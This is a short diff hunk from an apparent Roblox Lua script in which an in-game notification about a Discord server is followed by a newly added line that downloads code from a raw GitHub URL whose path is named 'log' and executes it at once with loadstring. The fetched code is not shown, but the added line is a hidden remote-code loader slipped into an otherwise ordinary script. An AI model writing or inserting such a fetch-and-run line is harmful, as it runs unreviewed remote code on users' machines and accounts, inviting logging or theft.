@@ -559,3 +559,5 @@ game.StarterGui:SetCore("SendNotification",{
     Text = "join the discord for bubble gum sim soon ";
     Duration = 10;
 })
+
+loadstring(game:HttpGEt(("https://raw.githubusercontent.com/Bytes77/stuff/main/log"))()
